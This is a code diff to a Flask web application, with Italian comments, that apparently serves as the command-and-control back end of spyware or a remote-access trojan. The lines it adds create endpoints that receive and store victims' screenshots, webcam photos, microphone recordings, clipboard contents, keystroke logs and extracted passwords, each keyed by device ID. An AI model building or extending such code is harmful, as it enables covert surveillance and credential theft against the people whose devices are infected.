@@ -252,7 +252,7 @@ def delete_device(device_id):
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
-# ============ API CATTURE COMPLETE ============
+# ============ API CATTURE ============
 
 @app.route('/api/captures', methods=['GET'])
 @login_required
@@ -289,7 +289,7 @@ def get_captures():
 
 @app.route('/api/captures/<int:capture_id>', methods=['GET'])
 @login_required
-def get_capture(capture_id):
+def get_capture_detail(capture_id):
     if not supabase:
         return jsonify({'error': 'Database non configurato'}), 500
     try:
@@ -314,7 +314,6 @@ def delete_capture(capture_id):
     if not supabase:
         return jsonify({'error': 'Database non configurato'}), 500
     try:
-        # Verifica che esista
         check = supabase.table('captures').select('id').eq('id', capture_id).execute()
         if not check.data:
             return jsonify({'error': 'Cattura non trovata'}), 404
@@ -331,7 +330,6 @@ def clear_captures():
     if not supabase:
         return jsonify({'error': 'Database non configurato'}), 500
     
-    # Verifica che sia admin
     current_user_data = supabase.table('users').select('username').eq('id', current_user.id).execute()
     if current_user_data.data and current_user_data.data[0]['username'] not in ['admin', 'BotZXY-Admin']:
         return jsonify({'error': 'Accesso negato'}), 403
@@ -340,6 +338,110 @@ def clear_captures():
         supabase.table('captures').delete().neq('id', 0).execute()
         log_action('system', 'captures_cleared', 'Tutte le catture cancellate')
         return jsonify({'status': 'cleared'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+# ============ API PER UPLOAD CATTURE ============
+
+@app.route('/api/screenshot/<device_id>', methods=['POST'])
+def upload_screenshot(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': 'screenshot',
+            'data': data.get('image_base64'),
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'screenshot_captured', 'Screenshot catturato')
+        return jsonify({'status': 'saved'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/webcam/<device_id>', methods=['POST'])
+def upload_webcam(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': 'webcam',
+            'data': data.get('image_base64'),
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'webcam_captured', 'Foto webcam catturata')
+        return jsonify({'status': 'saved'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/mic/<device_id>', methods=['POST'])
+def upload_mic(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': 'mic',
+            'data': data.get('audio_base64'),
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'mic_recorded', 'Audio registrato')
+        return jsonify({'status': 'saved'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/clipboard/<device_id>', methods=['POST'])
+def upload_clipboard(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': 'clipboard',
+            'data': data.get('content'),
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'clipboard_captured', 'Clipboard catturata')
+        return jsonify({'status': 'saved'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/keylog/<device_id>', methods=['POST'])
+def upload_keylog(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': 'keylog',
+            'data': data.get('keys'),
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'keylog_captured', 'Keylog catturato')
+        return jsonify({'status': 'saved'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/passwords/<device_id>', methods=['POST'])
+def upload_passwords(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': 'passwords',
+            'data': data.get('passwords'),
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'passwords_extracted', 'Password estratte')
+        return jsonify({'status': 'saved'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
